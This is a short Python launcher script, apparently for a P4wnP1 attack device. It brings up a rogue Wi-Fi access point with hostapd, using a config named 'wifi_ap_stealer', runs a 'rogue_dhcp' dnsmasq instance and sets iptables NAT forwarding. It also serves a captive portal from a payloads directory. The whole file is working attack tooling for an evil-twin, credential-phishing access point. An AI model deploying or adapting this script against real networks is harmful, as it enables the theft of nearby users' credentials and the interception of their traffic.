#!/usr/bin/env python3
import os, sys, subprocess, shlex, time
from pathlib import Path

CONF_DIR = Path("/opt/p4wnp1/config")
HOSTAPD = CONF_DIR / "wifi_ap_stealer_hostapd.conf"
DNSMASQ = CONF_DIR / "rogue_dhcp_dnsmasq.conf"

def sh(cmd):
    return subprocess.run(cmd, shell=True, text=True, capture_output=True)

def main():
    # Ensure Apache is up (portal already set by apache_portal_setup)
    sh("systemctl restart apache2")

    # Bring wlan0 up with common AP subnet 10.10.0.1/24 (adjust if you like)
    sh("ip link set wlan0 up")
    sh("ip addr add 10.10.0.1/24 dev wlan0 2>/dev/null || true")

    if not HOSTAPD.exists():
        print(f"[!] Missing hostapd conf: {HOSTAPD}", file=sys.stderr); return 2
    if not DNSMASQ.exists():
        print(f"[!] Missing dnsmasq conf: {DNSMASQ}", file=sys.stderr); return 2

    # Kill any previous runs
    sh("pkill hostapd || true")
    sh("pkill dnsmasq || true")

    # Start hostapd + dnsmasq in background via systemd-run so logs go to journal
    sh(f"systemd-run --unit=p4w-hostapd --collect /usr/sbin/hostapd {shlex.quote(str(HOSTAPD))}")
    time.sleep(1)
    sh(f"systemd-run --unit=p4w-dnsmasq --collect /usr/sbin/dnsmasq --conf-file={shlex.quote(str(DNSMASQ))}")

    # NAT to outbound if we have an upstream (wlan0 might also be upstream in some setups; here we prefer eth0)
    # You can tweak this: if eth0 has default route, do NAT from wlan0 -> eth0
    def_route = sh("ip route show default").stdout.strip()
    if " dev eth0 " in def_route:
        sh("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
        sh("iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT")
        sh("iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT")

    print("[+] Wi‑Fi AP + captive portal running (Apache serves /opt/p4wnp1/payloads/network/web).")
    return 0

if __name__ == "__main__":
    sys.exit(main())
